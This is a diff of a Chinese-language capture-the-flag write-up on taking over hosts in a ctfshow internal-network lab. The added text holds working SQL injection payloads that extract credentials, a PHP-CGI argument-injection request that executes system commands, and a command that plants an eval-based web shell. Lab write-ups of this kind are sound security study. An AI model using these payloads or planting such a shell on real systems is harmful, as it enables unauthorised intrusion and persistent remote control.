@@ -53,6 +53,10 @@ ifconfig           #查看ip
 
 <br>
 
+### 3.公鸡
+
+<br>
+
 这里我在网上找到个很奇怪的解，已知445端口存在一个samba的洞，可以直接打下来
 ````
 msfconsole
@@ -79,23 +83,46 @@ ssh -L 8085:172.2.249.5:80 ctfshow@pwn.challenge.ctf.show -p 28195
 
 <img src="https://54huarui.github.io/blogs/internalwww/4.png" width="880" height="480">
 
+<br>
+
+这里考了个沟槽的代码审计，审的是sql注入。根据回显得到账号密码
 
 
+````
+username=admin&email='union/**/select/**/username/**/from/**/user#@qq.com
+
+username=admin&email='union/**/select/**/password/**/from/**/user#@qq.com
+````
+
+得到账号密码ctfshow和ctfshase
+
+<br>
+
+md，复现到这里才知道，原来上面的samba才是真解，不过不管了，硬着头皮继续做复现
+回到fscan记得这里发现了一个cve
+
+<img src="https://54huarui.github.io/blogs/internalwww/6.png" width="880" height="480">
+
+<br>
+
+可以使用这个方法直接命令执行
+````
+POST /index.php/?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input HTTP/1.1
+
+<?php echo system("ls"); ?>
+````
+
+<img src="https://54huarui.github.io/blogs/internalwww/7.png" width="880" height="480">
 
 
+写shell咯
+````
+<?php echo system("echo '<? @eval(\$_POST[a]);?>' > 1.php");?>
+````
 
+<br>
 
-
-
-
-
-
-
-
-
-
-
-
+至此，三个内网主机已经全部拿下。
 
 
 
@@ -128,6 +155,6 @@ ssh -L 8085:172.2.249.5:80 ctfshow@pwn.challenge.ctf.show -p 28195
 
 
 
-## 写在前面
+## 写在后面
 
-有些东西不好明说，但是那种感觉又回来了。再不调整自己就得落得不好的下场
+有些东西不好明说，但是那种感觉又回来了。
